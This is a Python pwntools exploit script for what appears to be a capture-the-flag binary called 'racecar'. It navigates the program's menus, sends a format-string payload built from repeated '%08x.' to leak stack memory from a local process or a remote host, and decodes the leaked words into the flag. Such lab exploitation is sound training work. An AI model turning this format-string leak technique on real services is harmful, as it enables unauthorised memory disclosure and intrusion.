from pwn import *

context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.terminal = ['urxvt', '-e', 'sh', '-c']

CURR_DIR = os.path.dirname(os.path.realpath(__file__))
PATH = CURR_DIR + "/"
BINARY = "./racecar"
HOST = "46.101.23.188"
PORT = 31691

def attach(r):
    if type(r) == process:
        gdb.attach(r, "")


def prepare():
    r.sendlineafter(b"Name: ", b"a")
    r.sendlineafter(b"Nickname: ", b"a")
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", b"1")
    r.readuntil(b"Waiting for the race to finish...")


def leak_stack():
    r.sendlineafter(b"> ", b"----" + b"%08x."*32)
    r.readuntil(b"----")
    buffer = r.recvline()
    debug(b"stack leaked: " + buffer)
    return buffer


def extract_flag(stack):
    flag = b""
    values = str(stack).split(".")
    for v in values[11:-1]:
        flag += p32(int(v, 16))
    return str(flag).split("\\n")[0]


def exploit():
    info("prepare")
    prepare()
    info("leaking stack ...")
    stack = leak_stack()
    info("extract flag ...")
    flag = extract_flag(stack)
    success("flag: " + str(flag))


if __name__ == '__main__':
    os.chdir(PATH)
    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
    else:
        r = process(BINARY)
        attach(r)

    exploit()